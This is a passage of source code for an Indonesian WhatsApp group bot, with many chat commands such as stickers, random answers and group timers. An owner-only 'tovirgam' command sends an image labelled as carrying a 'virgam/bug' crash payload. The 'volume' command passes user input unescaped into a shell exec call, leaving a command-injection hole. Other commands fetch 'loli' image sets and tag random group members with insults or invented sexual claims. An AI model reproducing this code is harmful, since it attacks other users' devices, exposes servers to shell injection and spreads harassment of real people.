res = await wikiSearch(teks).catch(e => {
return setReply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: dev, caption: result}).catch(e => {
  setReply(result)
})
break
           
           
           
           
          
                
               
                    
		
           
           
                    
        
                    
        
           
           
          
		
				
                
           
           
           
           
           
       
       case 'loli':
       case 'milf':
       case 'husbu':
       case 'cosplay':
       case 'wallml':
         if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              let kentir = await getBuffer(wipi)
              teks = "Nih"                                          
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
              sendButImage(from, teks, copyright, kentir, buttons, {quoted: dev}) 
              limitAdd(senderNumber, user)
              break  
              
           case 'attp':
        try {

              if (args.length == 0) return setReply(`Example: ${prefix + command} YUxdev`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              xdev.sendMessage(from, buffer, sticker, { quoted: dev })
               } catch (e) {
               console.log(e)
               setReply(`Maap sedang error coba lagi besok`)
              
}
              break
              
     
            
            

	         
   
case 'ttp':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break


case 'ttpred':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=red`
sendStickerUrl(from, anjay)
break

case 'ttpblue':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=blue`
sendStickerUrl(from, anjay)
break

case 'ttpyellow':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=yellow`
sendStickerUrl(from, anjay)
break

case 'ttpgreen':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=green`
sendStickerUrl(from, anjay)
break

case 'ttppurple':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=purple`
sendStickerUrl(from, anjay)
break

case 'ttppink':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=deeppink`
sendStickerUrl(from, anjay)
break
	
case 'ttpviolet':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=violet`
sendStickerUrl(from, anjay)
break

case 'ttpmagenta':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=magenta`
sendStickerUrl(from, anjay)
break
	
	
	
	
	
	
	
case 'ttp2':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=white`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break


case 'ttp2red':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=red`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2blue':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=blue`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2green':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=green`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
case 'ttp2yellow':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=yellow`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2pink':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=deeppink`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break


case 'ttp2magenta':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=magenta`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
case 'ttp2purple':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=purple`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2violet':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=violet`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
	
	
	
	
	
	
	
case 'ttp3':
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/attp?teks=${q}`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break



     

 case 'get':
case 'fetch':
            if(!q) return setReply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            
            })   
            break
        
        


        
        
        
           //By yudha perdana
           case 'wangy':
              if (!q) return setReply('query')
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              xdev.sendMessage(from, awikwok, text)
              break
           
           
 
          
           
 
           
           
         


 
    
           
           
           
				
		
           
          
           
           
           
           
           
           case 'jadian':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           if(!isGroup) return setReply("Ga mau ah, lu jelek")
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					limitAdd(senderNumber, user)
					break
	
case 'ngewe':
   if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isGroup) return setReply("Maap om aku masih blom cukup umur")
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					limitAdd(senderNumber, user)
					break
           
           
				

				

			

           
           case 'memeindo':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           data = fs.readFileSync('./lib/game/memeindo.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           buffer = await getBuffer(randKey.result)
           xdev.sendMessage(from, buffer, image, {quoted : dev, caption : "Nih"})
           limitAdd(senderNumber, user)
           break
           
           
           
           
           case 'quotes':
           data = fs.readFileSync('./lib/game/quotes.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           quotes = randKey.quotes
           xdev.sendMessage(from, quotes, text, {quoted : dev})
           break
           
           
           
           
           case 'diem':
			     if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
			if(!checkDataName("mute", from, DataId)) { createDataId("mute", DataId) }
                if (checkDataId ("mute", from, DataId) ) return setReply(`*aku udah diem nih*`)
                addDataId(from, "mute", DataId)
                setReply( `Baik kak 😥 `)
                break
                
                case 'udah':
      if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
               if (!checkDataId ("mute", from, DataId) ) return setReply(`Iya udah*`)
                removeDataId ("mute", from, DataId)
                setReply(`Oke kak 😁`)
            break
					
           
           
         
           
           
           
           case 'katailham':  
                       if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
					xdev.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
					
					case 'bucin':
		            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
					xdev.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
           
 case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
					break

case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
					break
					
case 'apakah':
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
					break
					
case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
					break
					
case 'rate':
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
					break
					
case 'sangecek':
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: dev })
					break
					
case 'gaycek':
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: dev })
					break
					
case 'lesbicek':
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bo = lesbi[Math.floor(Math.random() * lesbi.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bo+'%', text, { quoted: dev })
					break
					
case 'gantengcek':
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: dev })
					break
					
case 'cantikcek':
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: dev })
					break
					
case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: dev })
					break
				
case 'hobby':
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dev })
					break
					case 'babi':
 if(!isGroup) return setReply("Hanya bisa di group")
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bua = pushname[Math.floor(Math.random() * mge.length)]
              teks = `Yang Paling Babi Disini Adalah : @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
        if(!isGroup) return setReply("Hanya bisa di group")
              membr = []
              const ngewe = groupMembers
              
              const beb = ngewe[Math.floor(Math.random() * ngewe.length)]
              
              teks = `Yang Paling Beban Disini Adalah : @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break


           
           
           
           
           
           
           
           
           
           
           
           
       case 'tovirgam':
       case 'jadivirgam':
        if (!isOwner) return onlyOwner()
					if (!isQuotedSticker) return setReply('Reply stiker nya')
					if (isQuotedSticker){
						const encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await xdev.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return setReply(mess.error.api)
							buffer = fs.readFileSync(ran)
							xdev.sendMessage(from, buffer, image, {quoted: dev, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
           
           
           
case 'out':
case 'leave':
if (!isGroup) return 
if (!isOwner) return onlyOwner()
if (!isOwner && autosticker) return sendSticker(gaboleh)
xdev.groupLeave(from)
break
						
						
						
case 'reportbug':
case 'bugreport':
case 'laporbug':
if(!q) return setReply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
if (isMedia && !dev.message.videoMessage || isQuotedImage) {
if(!q) return setReply("Masukan laporan bug yang di alami")
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
buff = await xdev.downloadMediaMessage(encmedia)
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
teks =`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` 
mhan = await xdev.prepareMessage(from, buff, image)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
let nanu = {
imageMessage: locmhan.message.imageMessage,
contentText:  teks,
footerText: copyright,
buttons: mok,
headerType: 4
}
await xdev.sendMessage(Ownerin, nanu, MessageType.buttonsMessage, {quoted: setQuoted})
await xdev.modifyChat(Ownerin, ChatModification.delete)
await xdev.sendMessage(from,"Laporan bug telah dikirim ke developer",text)
} else {
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
teks =`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`

let lol = {
contentText: teks,
footerText: copyright,
buttons: mok,
headerType: 1,
}
await xdev.sendMessage(Ownerin, lol, MessageType.buttonsMessage, {quoted: setQuoted})
await xdev.modifyChat(Ownerin, ChatModification.delete)
await xdev.sendMessage(from,"Laporan bug telah dikirim ke developer",text)
}
break
						
						
case 'thanksuser':{
if(!q) return setReply("Masukan nomer")
let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"}]
teks =`
Terimakasih atas laporan bug
yang kamu berikan, Kami akan 
memperbaiki bug tersebut
secepat mungkin, Jika sudah di fix
Kami akan mengupload ke repository,
Selalu cek Repository kami
untuk melihat update terbaru

${calender}
_Thanks for choosing ${fake}_`
xdev.updatePresence(from, Presence.composing)
await sendButMessage (q, teks, `©Developer`, mok)
await xdev.modifyChat(Ownerin, ChatModification.delete)
}
break
						
case 'banuser':
if (!isOwner) return setReply(mess.only.Bowner)
if(!q) return setReply(`Masukan Id whatsapp`)
nama = xdev.contacts[q] != undefined ? xdev.contacts[q].notify = undefined ? PhoneNumber('+' + q.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[q].notify || xdev.contacts[q].vname : PhoneNumber('+' + q.replace('@s.whatsapp.net', '')).getNumber('international')
if(cekBannedUser (q, ban)) return setReply("Udah di ban kak")
addBanned(nama,calender,  q, ban)               
teks =`
Kamu telah di banned karena
menyalahgunakan Fitur _*reportbug*_

Nama: ${nama}
Nomer: ${q.split("@")[0]}
Tanggal: ${calender}
Total Banned : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}

${copyright}`
xdev.updatePresence(from, Presence.composing)
await xdev.sendMessage(q, teks, text)
await xdev.modifyChat(Ownerin, ChatModification.delete)
break
						
						
					
						
case 'tts':	
try{
if (args.length < 1) return setReply('Kode bahasanya mana kak?')
if (args.length < 2) return setReply('Textnya mana kak?')
gtts = require('./lib/gtts')(args[1])
dtt = q
ranm = getRandom('.mp3')
if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
gtts.save(ranm, dtt, function() {
xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
fs.unlinkSync(ranm)
})  
 } catch (err){
console.log(err)
console.log(color("Auto turn to id of tts"))
gtts = require('./lib/gtts')("id")
dtt = q
ranm = getRandom('.mp3')
if(dtt.length > 600) return setReply('Textnya kebanyakan kak') 
gtts.save(ranm, dtt, function() {
xdev.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
fs.unlinkSync(ranm)
})
}
break
						
						
				
						
           
           
           
           
           
           



           
           
           
           
           
          
           
           
				
					
		
					 
					
					
					
case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (!isQuotedAudio) return setReply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await xdev.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return setReply('Error!')
jadie = fs.readFileSync(rname)
xdev.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: setQuoted})
fs.unlinkSync(rname)
}
)
break
					
					
                 
                 
                 
           
           
           
           case 'clear':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)                
                break
           
           case 'delchat':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)
                setTimeout( () => {
                xdev.sendMessage(from, aw, text)
                },3000)
                break
           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Close time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
					setReply(close)
				}, timer)
				break
				
				
case 'opentime':        
			if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
               if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Open time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = dev.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
					setReply(open)
				}, timer)
				break
				
				
				
case 'nuliskiri':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskiri* teks`)
                setReply(mess.wait)                
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkiri.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                    '-size','960x1280',
                    '-pointsize','22',
                    '-interline-spacing','2',
                    '-annotate','+140+153',
                    fixHeight,'./temp/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkiri.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
           break
                
                case 'nuliskanan':{
                if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkanan.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                     '-size', '960x1280',
                    '-pointsize','23',
                    '-interline-spacing','2',
                    '-annotate','+128+129',
                    fixHeight, './temp/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    xdev.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkanan.jpg'), image, {quoted: dev, caption: `Nih...`})
                    limitAdd(senderNumber, user)
                })
            }
             break
            case 'foliokiri':{
